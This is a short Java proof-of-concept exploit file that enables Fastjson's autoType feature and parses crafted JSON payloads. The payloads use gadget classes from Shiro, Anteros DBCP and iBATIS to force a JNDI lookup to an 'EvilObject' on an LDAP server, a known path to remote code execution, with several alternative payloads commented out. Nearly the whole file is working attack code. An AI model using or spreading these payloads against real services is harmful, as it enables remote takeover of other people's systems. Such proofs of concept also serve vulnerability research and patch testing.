import com.alibaba.fastjson.JSON;  
import com.alibaba.fastjson.parser.ParserConfig;  
  
public class Exp {  
    public static void main(String[] args) {  
        ParserConfig.getGlobalInstance().setAutoTypeSupport(true);  
        // poc 1
        String poc = "{\"@type\":\"org.apache.shiro.realm.jndi.JndiRealmFactory\", \"jndiNames\":[\"ldap://localhost:1099/EvilObject\"], \"Realms\":[\"\"]}";  

        // poc 2
//        String poc = "{\"@type\":\"br.com.anteros.dbcp.AnterosDBCPConfig\",\"metricRegistry\":\"ldap://localhost:1099/EvilObject\"}";  

        // poc 3
//        String poc = "{\"@type\":\"br.com.anteros.dbcp.AnterosDBCPConfig\",\"healthCheckRegistry\":\"ldap://localhost:1099/EvilObject\"}";  
//        String poc = "{\"@type\":\"com.ibatis.sqlmap.engine.transaction.jta.JtaTransactionConfig\"," +  
//                "\"properties\": {\"@type\":\"java.util.Properties\",\"UserTransaction\":\"ldap://localhost:1099/EvilObject\"}}";  
        JSON.parse(poc);  
 }  
}